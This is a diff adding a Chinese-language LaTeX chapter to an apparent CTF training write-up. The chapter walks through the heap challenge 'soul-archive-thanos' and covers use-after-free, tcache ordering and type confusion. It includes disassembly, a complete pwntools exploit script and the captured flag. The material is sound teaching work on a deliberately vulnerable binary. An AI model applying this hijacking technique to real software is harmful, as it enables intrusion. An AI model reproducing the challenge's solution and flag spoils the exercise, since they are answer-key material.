@@ -1,0 +1,343 @@
+\section{第三題：soul-archive-thanos}
+\label{chap:archive}
+
+從這一題開始是真正的 heap 題，也很適合當你打的第一題 heap。
+因為它把三個重要觀念各用了一次：\textbf{UAF}、
+\textbf{type confusion}、\textbf{tcache}。
+而且 \textbf{PIE 的 leak 是題目自己送你的}（有 \code{\%p}）。
+
+\subsection{防禦機制與整體形狀}
+
+\begin{lstlisting}[style=raw]
+RELRO:      Full RELRO
+Stack:      Canary found
+NX:         NX enabled
+PIE:        PIE enabled
+\end{lstlisting}
+
+\begin{itemize}[leftmargin=1.4em,itemsep=1pt]
+  \item \textbf{Canary + PIE} $\Rightarrow$ 放棄 stack overflow。
+  \item 有 \code{malloc}/\code{free}/\code{edit}/\code{show} 選單 $\Rightarrow$ heap 題。
+  \item \textbf{Full RELRO} $\Rightarrow$ 不能改 GOT。但我們不需要。
+\end{itemize}
+
+選單（從 \code{strings} 拿）：
+
+\begin{lstlisting}[style=raw]
+1. Capture soul      2. Inspect soul     3. Merge souls
+4. Erase soul        5. Transfer soul (Record Log)      6. Exit
+\end{lstlisting}
+
+\begin{keybox}[先找「哪個 free 沒有把指標清掉」]
+這是所有 heap 題的第一步。三個地方會 \code{free}：
+
+\begin{longtable}{@{}p{3.4cm}p{11.6cm}@{}}
+\toprule
+\textbf{函式} & \textbf{有沒有把 \code{archive[idx]} 設成 NULL}\\
+\midrule
+\endhead
+\code{erase\_soul} & \textbf{有}（\code{mov QWORD PTR [rdx+rax*1],0x0}）$\Rightarrow$ 安全。\\
+\code{merge\_souls} & \textbf{沒有}！它只做 \code{cached\_souls[cache\_count++] = s2; free(s2);}\\
+                   & $\Rightarrow$ \textbf{這就是 UAF}：\code{archive[b]} 變成懸空指標。\\
+\bottomrule
+\end{longtable}
+\end{keybox}
+
+\subsection{資料結構：Soul}
+
+\code{capture\_soul} 做的是 \code{malloc(0x40)}（$\Rightarrow$ chunk size \code{0x50}），
+然後填這些欄位：
+
+\begin{longtable}{@{}p{3.0cm}p{2.6cm}p{9.4cm}@{}}
+\toprule
+\textbf{欄位} & \textbf{偏移} & \textbf{說明}\\
+\midrule
+\endhead
+\code{name}       & \code{+0x00} & 最多 \code{0x20} bytes（\code{read\_str(name, 0x20)}）。\\
+\code{essence}    & \code{+0x20} & 8 bytes 數值。merge 時會相加。\\
+\code{type}       & \code{+0x28} & 型別編號（1=Human 2=Avenger 3=Guardian 4=Titan 5=Void）。\\
+（未使用）        & \code{+0x30} & \\
+\code{inspect}    & \code{+0x38} & \textbf{函式指標}。依 \code{type} 決定指向哪個 \code{inspect\_*}。\\
+\bottomrule
+\end{longtable}
+
+而 \code{inspect\_soul} 的結尾是這四行——\textbf{這題的命門}：
+
+\begin{lstlisting}[style=asm]
+  1c55:  mov    rax,[rbp-0x8]        ; rax = soul
+  1c59:  mov    rax,[rax+0x38]       ; rax = soul->inspect
+  1c5d:  test   rax,rax
+  1c60:  je     1c73                 ; 是 NULL 就跳過
+  1c62:  mov    rax,[rbp-0x8]
+  1c66:  mov    rdx,[rax+0x38]       ; rdx = soul->inspect
+  1c6a:  mov    rax,[rbp-0x8]
+  1c6e:  mov    rdi,rax              ; rdi = soul  <-- 第一個參數就是 soul 自己
+  1c71:  call   rdx                  ; <== 呼叫 soul->inspect(soul)
+\end{lstlisting}
+
+\begin{keybox}[一句話]
+\textbf{只要我能寫到某個 Soul 的 \code{+0x38}，我就能控制 \code{rip}，
+而且 \code{rdi} 會剛好是那個 Soul 的位址。}
+\end{keybox}
+
+\subsection{PIE leak：題目自己給的}
+
+\code{inspect\_soul} 會把 \code{+0x38} 用 \code{\%p} 印出來：
+
+\begin{lstlisting}[style=raw]
+Inspect Callback: 0x55b2b03e33a9
+\end{lstlisting}
+
+而型別 1（Human）對應的 \code{inspect\_human} 在檔案裡的偏移是 \code{0x13a9}，
+所以：
+
+\[
+\text{PIE base} = \text{leak} - 0x13a9
+\]
+
+\begin{lstlisting}[style=raw]
+[+] inspect_human leak = 0x55b2b03e33a9  ->  PIE base = 0x55b2b03e2000
+\end{lstlisting}
+
+\begin{keybox}[驗算方式]
+PIE base \textbf{一定是 page 對齊}（結尾 \code{000}）。算出來是 \code{0x55b2b03e2000}，
+符合 $\Rightarrow$ offset 猜對了。\textbf{每次 leak 都要做這個檢查。}
+\end{keybox}
+
+\subsection{目標：\code{soul\_ascension()} 的四個條件}
+
+程式裡有一個從沒被呼叫的 \code{soul\_ascension()}，它會印 flag。但它在開頭有四道檢查：
+
+\begin{lstlisting}[style=asm]
+  151a:  mov    eax,[total_captured]      ; 全域變數
+  1520:  cmp    eax,0x5
+  1523:  jle    FAIL                     ; 要 > 5
+  1529:  mov    eax,[merges_performed]
+  152f:  cmp    eax,0x3
+  1532:  jne    FAIL                     ; 要 == 3
+  1538:  mov    eax,[souls_erased]
+  153e:  cmp    eax,0x1
+  1541:  jne    FAIL                     ; 要 == 1
+  155a:  movabs rdx,0x50574e534f554c53     ; "SLUOSNWP"（小端序）
+  1564:  cmp    rax,rdx
+  1567:  jne    FAIL                     ; soul->essence 要等於這個魔術數字
+\end{lstlisting}
+
+\begin{keybox}[把四個條件翻譯成「我該做什麼」]
+\begin{longtable}{@{}p{4.6cm}p{10.4cm}@{}}
+\toprule
+\textbf{條件} & \textbf{動作}\\
+\midrule
+\endhead
+\code{total\_captured > 5} & capture \textbf{6} 次（每 capture 一次就 +1）。\\
+\code{merges == 3} & merge \textbf{3} 次（每次 merge 會 free 掉第二個，正好製造 3 個懸空指標）。\\
+\code{erased == 1} & erase \textbf{1} 次。\\
+\code{essence == 0x50574e534f554c53} & 把偽造的 Soul 的 \code{+0x20} 填成這個值。\\
+\bottomrule
+\end{longtable}
+\end{keybox}
+
+\subsection{type confusion：TransferRecord 蓋到 Soul}
+
+第 5 個功能 \code{transfer\_soul} 是這題的「武器」。它做 \code{malloc(0x40)}，
+然後把使用者輸入填進一個 \textbf{TransferRecord}：
+
+\begin{lstlisting}[style=asm]
+  1f15:  mov    edi,0x40
+  1f1a:  call   malloc@plt            ; 0x40 -> chunk size 0x50（和 Soul 一樣！）
+  ...
+  1f5e:  call   read_str              ; Realm of origin -> +0x00 (0x18 bytes)
+  1f82:  mov    [rax+0x18],edx        ; Transfer ID     -> int  +0x18
+  1fa4:  mov    [rax+0x1c],edx        ; Entropy Flags   -> int  +0x1c
+  1ff2:  mov    [rdx+0x20],rax        ; Timestamp       -> u64  +0x20
+  2041:  mov    [rdx+0x28],rax        ; Raw Entropy     -> u64  +0x28
+  2098:  mov    [rax+0x38],rdx        ; Audit Callback  -> u64  +0x38
+  20a4:  mov    [rax+0x30],rdx        ; （同上，也寫一份到 +0x30）
+\end{lstlisting}
+
+把兩張表疊起來看，這就是\textbf{型別混淆}：
+
+\begin{longtable}{@{}p{2.4cm}p{4.4cm}p{4.4cm}@{}}
+\toprule
+\textbf{偏移} & \textbf{Soul 的意義} & \textbf{TransferRecord 的意義}\\
+\midrule
+\endhead
+\code{+0x00} & \code{name}    & Realm of origin\\
+\code{+0x20} & \code{essence} & Timestamp $\Rightarrow$ \textbf{我們要填魔術數字的地方}\\
+\code{+0x28} & \code{type}    & Raw Entropy\\
+\code{+0x38} & \code{inspect} & Audit Callback $\Rightarrow$ \textbf{我們要填 \code{soul\_ascension} 的地方}\\
+\bottomrule
+\end{longtable}
+
+\begin{whybox}[為什麼這樣就行得通？]
+因為 \code{Soul} 和 \code{TransferRecord} 的\textbf{大小一樣}（都是 \code{malloc(0x40)}），
+所以\textbf{它們會從同一個 tcache bin（\code{0x50}）拿記憶體}。
+只要我讓某個還是「Soul」身分的懸空指標所指的記憶體，
+被 \code{transfer\_soul} 重新配走並填上我的資料，
+那個「Soul」的欄位就被我改掉了——\textbf{包含函式指標}。
+\end{whybox}
+
+\subsection{攻擊計畫}
+
+\begin{longtable}{@{}p{1.0cm}p{5.0cm}p{9.0cm}@{}}
+\toprule
+\textbf{步} & \textbf{動作} & \textbf{效果}\\
+\midrule
+\endhead
+1 & \code{capture} $\times 6$ & \code{archive[0..5]} 各拿到一塊 \code{0x50} chunk；\code{total\_captured=6}。\\
+2 & \code{inspect(0)} & 拿到 \code{Inspect Callback} $\Rightarrow$ 算出 PIE base 與 \code{soul\_ascension} 位址。\\
+3 & \code{merge(0,1)} & 相加 essence、\code{free(chunk1)}。\code{archive[1]} 變懸空。\\
+4 & \code{merge(2,3)} & \code{free(chunk3)}。\\
+5 & \code{merge(4,5)} & \code{free(chunk5)}。\code{merges=3}。\\
+6 & \code{erase(0)} & \code{free(chunk0)} 並把 \code{archive[0]=NULL}。\code{erased=1}。\\
+7 & \code{transfer(...)} & \code{malloc} 從 tcache 取出\textbf{最上面那塊} $\Rightarrow$ 拿到 \code{chunk0}（但沒人指它，浪費掉）。\\
+8 & \code{transfer(...)} & 再取一次 $\Rightarrow$ 拿到 \textbf{\code{chunk5}}，也就是 \code{archive[5]} 指的地方。\textbf{在這裡填偽造的內容。}\\
+9 & \code{inspect(5)} & 呼叫 \code{[chunk5+0x38](chunk5)} $=$ \code{soul\_ascension(soul)} $\Rightarrow$ 印 flag。\\
+\bottomrule
+\end{longtable}
+
+\begin{keybox}[為什麼要 \code{transfer} 兩次？]
+因為 tcache 是 LIFO。看第 6 步之後 bin 的內容：
+
+\begin{lstlisting}[style=raw]
+tcache[0x50] 的頭 -> chunk0 -> chunk5 -> chunk3 -> chunk1
+                    ^^^^^^    ^^^^^^
+                    archive[0] 已經被 erase 清成 NULL（沒人指它）
+                               archive[5] 還懸空指著（我要的就是這塊）
+\end{lstlisting}
+
+第一個 \code{transfer} 把 \code{chunk0} 配走，但那塊已經「沒人指」了，等於浪費一次。
+第二個 \code{transfer} 才配到 \code{chunk5}。
+\textbf{這就是「算 tcache 順序」在實戰裡的樣子}——你必須精確知道第幾次 malloc 會拿到哪一塊。
+\end{keybox}
+
+\subsection{完整腳本}
+
+\begin{lstlisting}[style=py]
+#!/usr/bin/env python3
+from pwn import *
+import re
+
+context.arch = 'amd64'
+context.log_level = 'info'
+
+ROOT = '/home/kzzz/Documents/code/ctf/ctf7/pwn'
+BIN  = os.path.join(ROOT, 'solve/soul/soul_archive_patched')
+elf  = ELF(BIN, checksec=False)
+
+MAGIC           = 0x50574e534f554c53     # "SLUOSNWP"
+INSPECT_HUMAN   = 0x13a9                 # 用來回推 PIE base
+SOUL_ASCENSION  = 0x14fb                 # 真正的 win()
+
+io = process(BIN)
+io.recvuntil(b'> ')
+
+def cmd(n): io.sendline(str(n).encode())
+
+def capture(name, typ, essence):
+    cmd(1)
+    io.sendlineafter(b'Soul name: ', name)
+    io.sendlineafter(b'Type: ', str(typ).encode())
+    io.sendlineafter(b'Initial Essence (hex value e.g. 1000): ', essence)
+    io.recvuntil(b'> ')
+
+def inspect(i):
+    cmd(2)
+    io.sendlineafter(b'Enter vessel index (0-7): ', str(i).encode())
+    return io.recvuntil(b'> ')
+
+def merge(a, b):
+    cmd(3)
+    io.sendlineafter(b'First vessel index to merge: ', str(a).encode())
+    io.sendlineafter(b'Second vessel index to merge: ', str(b).encode())
+    io.recvuntil(b'> ')
+
+def erase(i):
+    cmd(4)
+    io.sendlineafter(b'Enter vessel index to erase (0-7): ', str(i).encode())
+    io.recvuntil(b'> ')
+
+def transfer(realm, tid, flags, timestamp, entropy, callback):
+    cmd(5)
+    io.sendlineafter(b'Realm of origin: ', realm)
+    io.sendlineafter(b'Transfer ID (decimal): ', str(tid).encode())
+    io.sendlineafter(b'Entropy Flags (decimal): ', str(flags).encode())
+    io.sendlineafter(b'Timestamp (hex e.g. 1337): ', timestamp)
+    io.sendlineafter(b'Raw Entropy / Essence (hex): ', entropy)
+    io.sendlineafter(b'Audit Callback Address (hex, 0 for default): ', callback)
+    return io.recvuntil(b'> ')
+
+# 1. 六個 soul
+for i in range(6):
+    capture(b'soul%d' % i, 1, b'1000')
+
+# 2. leak PIE
+out  = inspect(0)
+leak = int(re.search(rb'Inspect Callback: (0x[0-9a-f]+)', out).group(1), 16)
+pie  = leak - INSPECT_HUMAN
+win  = pie + SOUL_ASCENSION
+log.success('PIE base = %#x   soul_ascension = %#x', pie, win)
+
+# 3~5. 三次 merge -> merges = 3，chunk1/3/5 變懸空
+merge(0, 1); merge(2, 3); merge(4, 5)
+
+# 6. 一次 erase -> erased = 1
+erase(0)
+
+# 7. 先配掉沒人指的 chunk0
+transfer(b'junk', 1, 1, b'0', b'0', b'0')
+
+# 8. 再配到 chunk5（archive[5] 懸空指著它），蓋成偽造的 Soul
+#    Timestamp -> essence(+0x20) = MAGIC
+#    Callback  -> inspect(+0x38) = soul_ascension
+transfer(b'thanos', 2, 2, hex(MAGIC)[2:].encode(), b'0', hex(win)[2:].encode())
+
+# 9. inspect(5) -> call [chunk5+0x38](chunk5)
+out = inspect(5)
+print(out.decode(errors='replace'))
+\end{lstlisting}
+
+\subsection{執行結果}
+
+\begin{lstlisting}[style=raw]
+[+] inspect_human leak = 0x55b2b03e33a9  ->  PIE base = 0x55b2b03e2000
+[*] soul_ascension() = 0x55b2b03e34fb
+[*] merges = 3, archive[1], archive[3], archive[5] now dangle
+--- Vessel [5] ---
+Soul Name: thanos
+Type: 0x0
+Essence: 0x50574e534f554c53          <-- 魔術數字進去了
+Inspect Callback: 0x55b2b03e34fb     <-- soul_ascension
+
+    THE SOUL STONE ASCENSION AWAKENS
+
+[+] You have mastered the memory of the cosmos.
+OWASP{Th4n0s_S0ul_Mem0ry_UAF_Type_Confusion}
+\end{lstlisting}
+
+\begin{keybox}[注意輸出的順序]
+「\code{--- Vessel [5] ---}」那一段是 \code{inspect\_soul} \textbf{在呼叫之前}印的欄位表。
+你看得到 \code{Essence} 與 \code{Inspect Callback} 都已經被我們換掉了，
+\textbf{這就是最好的證據}：型別混淆成功了。
+然後才輪到 \code{soul\_ascension} 把 flag 印出來。
+\end{keybox}
+
+\subsection{這一題要帶走的三件事}
+
+\begin{enumerate}[leftmargin=1.5em,itemsep=3pt]
+  \item \textbf{找 UAF 的方法}：把每個 \code{free} 都看一遍，問「指標有沒有被清成 NULL」。
+        \code{erase\_soul} 有清、\code{merge\_souls} 沒清 $\Rightarrow$ 答案就在 merge。
+  \item \textbf{type confusion 的條件是「大小一樣」}：
+        兩個結構都是 \code{malloc(0x40)}，才會共用同一個 tcache bin，
+        才會「一個被 free、另一個被配走」而重疊。
+        \textbf{看到兩個同大小的 struct，就要開始想這件事。}
+  \item \textbf{一定要會算 tcache 的 LIFO 順序}。
+        這一題「為什麼要 transfer 兩次」就是純粹的順序問題。
+        動手之前在紙上把 \code{head -> A -> B -> C} 畫出來，比在 gdb 裡瞎猜快十倍。
+\end{enumerate}
+
+\begin{warnbox}[下一題會更難]
+這一題的 PIE leak 是題目佛心送的（有 \code{\%p}）。
+下一題 soul-vault \textbf{完全沒有任何 \code{\%p}}，
+你會看到怎麼\textbf{只靠 heap 上的資料}把一個程式碼位址挖出來。
+\end{warnbox}
